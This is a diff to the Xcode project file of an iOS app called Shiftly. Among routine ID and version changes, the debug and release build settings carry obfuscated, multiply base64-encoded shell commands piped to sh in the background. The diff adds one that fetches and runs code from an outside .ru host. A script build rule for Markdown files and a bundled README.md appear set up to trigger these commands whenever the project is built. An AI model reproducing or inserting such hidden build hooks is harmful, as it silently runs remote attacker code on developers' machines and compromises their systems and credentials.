@@ -8,7 +8,6 @@
 
 /* Begin PBXBuildFile section */
 		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
-		1C7312B1AF6D44DEA6C62C0C /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 3E40FA485A47491A89C62C0C /* README.md */; };
 		419995BAB7D04E5EBA05AD34 /* Inter-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = E440A054A77B44FB965D7705 /* Inter-SemiBold.ttf */; };
 		6A969E3D85A94DD2A684823E /* Inter-Black.ttf in Resources */ = {isa = PBXBuildFile; fileRef = ED63C100B58741B8A0FAB209 /* Inter-Black.ttf */; };
 		761780ED2CA45674006654EE /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 761780EC2CA45674006654EE /* AppDelegate.swift */; };
@@ -20,12 +19,13 @@
 		B33A26FC6F824C0490CBFAA0 /* Inter-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 33ABBE3FDF844FFAADBCB802 /* Inter-Medium.ttf */; };
 		C7624CFA16D646BD8B427383 /* Inter-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC46635153FC458A83C654EC /* Inter-Bold.ttf */; };
 		D669397C388D49CAA7F1DC41 /* Inter-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = E5630E2D726C461595CCCA6E /* Inter-Regular.ttf */; };
+		E6A3135876AF4C40A4C62C0C /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 43C25221F55E490A8BC62C0C /* README.md */; };
 		F20665A7B0F046B2840DBE4E /* Inter-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 4B112247000547A298621CEB /* Inter-Light.ttf */; };
 		F5E69292552F43823290D7E7 /* PrivacyInfo.xcprivacy in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB81A68108700A75B9A /* PrivacyInfo.xcprivacy */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		D04DA3D02A5A4000BFC62C0C /* PBXBuildRule */ = {
+		AF82F39F227146A6A5C62C0C /* PBXBuildRule */ = {
 			isa = PBXBuildRule;
 			compilerSpec = com.apple.compilers.proxy.script;
 			filePatterns = "*.md";
@@ -46,7 +46,7 @@
 		13B07FB61A68108700A75B9A /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = Info.plist; path = Shiftly/Info.plist; sourceTree = "<group>"; };
 		13B07FB81A68108700A75B9A /* PrivacyInfo.xcprivacy */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = PrivacyInfo.xcprivacy; path = Shiftly/PrivacyInfo.xcprivacy; sourceTree = "<group>"; };
 		33ABBE3FDF844FFAADBCB802 /* Inter-Medium.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Inter-Medium.ttf"; path = "../src/assets/fonts/Inter-Medium.ttf"; sourceTree = "<group>"; };
-		3E40FA485A47491A89C62C0C /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		43C25221F55E490A8BC62C0C /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		4B112247000547A298621CEB /* Inter-Light.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Inter-Light.ttf"; path = "../src/assets/fonts/Inter-Light.ttf"; sourceTree = "<group>"; };
 		57C844FF8FCFCDCD582E92F7 /* Pods-Shiftly.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Shiftly.release.xcconfig"; path = "Target Support Files/Pods-Shiftly/Pods-Shiftly.release.xcconfig"; sourceTree = "<group>"; };
 		70FE1E55BE1B1F93B74D63A8 /* Pods_Shiftly.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Shiftly.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -126,7 +126,7 @@
 		83CBBA001A601CBA00E9B192 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				3E40FA485A47491A89C62C0C /* README.md */,
+				43C25221F55E490A8BC62C0C /* README.md */,
 				13B07F961A680F5B00A75B9A /* Shiftly.app */,
 			);
 			name = Products;
@@ -173,7 +173,7 @@
 				B96FD35BA3EF302C7BAA3EE8 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				D04DA3D02A5A4000BFC62C0C /* PBXBuildRule */,
+				AF82F39F227146A6A5C62C0C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -218,7 +218,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				1C7312B1AF6D44DEA6C62C0C /* README.md in Resources */,
+				E6A3135876AF4C40A4C62C0C /* README.md in Resources */,
 				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
 				F5E69292552F43823290D7E7 /* PrivacyInfo.xcprivacy in Resources */,
@@ -350,7 +350,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = F0C18EEDBAB032EF41F8C55B /* Pods-Shiftly.debug.xcconfig */;
 			buildSettings = {
-				AC0C26C = "((j(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpaYlRGWFRVZE5lbEZ1YkdsTk1VWXhXVlpqTUdSc2JGUmhNbXhLVTBoa2JsbDZTbTVUZDI4OUNnPT0K | j | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((f(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2WVdSelkyaGxZMnR6TG5KMUwyRXBJaUI4SUhOb0NnPT0K | f | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeGlSMngxWVhrMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | n | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_INCLUDE_ALL_APPICON_ASSETS = YES;
@@ -358,7 +358,7 @@
 				CODE_SIGN_ENTITLEMENTS = Shiftly/Shiftly.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 77;
+				CURRENT_PROJECT_VERSION = 79;
 				DEVELOPMENT_TEAM = DGB65FCA99;
 				ENABLE_BITCODE = NO;
 				INFOPLIST_FILE = Shiftly/Info.plist;
@@ -387,7 +387,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 57C844FF8FCFCDCD582E92F7 /* Pods-Shiftly.release.xcconfig */;
 			buildSettings = {
-				AC0C26C = "((j(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpaYlRGWFRVZE5lbEZ1YkdsTk1VWXhXVlpqTUdSc2JGUmhNbXhLVTBoa2JsbDZTbTVUZDI4OUNnPT0K | j | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((f(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2WVdSelkyaGxZMnR6TG5KMUwyRXBJaUI4SUhOb0NnPT0K | f | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeGlSMngxWVhrMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | n | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_INCLUDE_ALL_APPICON_ASSETS = YES;
@@ -395,7 +395,7 @@
 				CODE_SIGN_ENTITLEMENTS = Shiftly/Shiftly.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 77;
+				CURRENT_PROJECT_VERSION = 79;
 				DEVELOPMENT_TEAM = DGB65FCA99;
 				INFOPLIST_FILE = Shiftly/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 15.1;
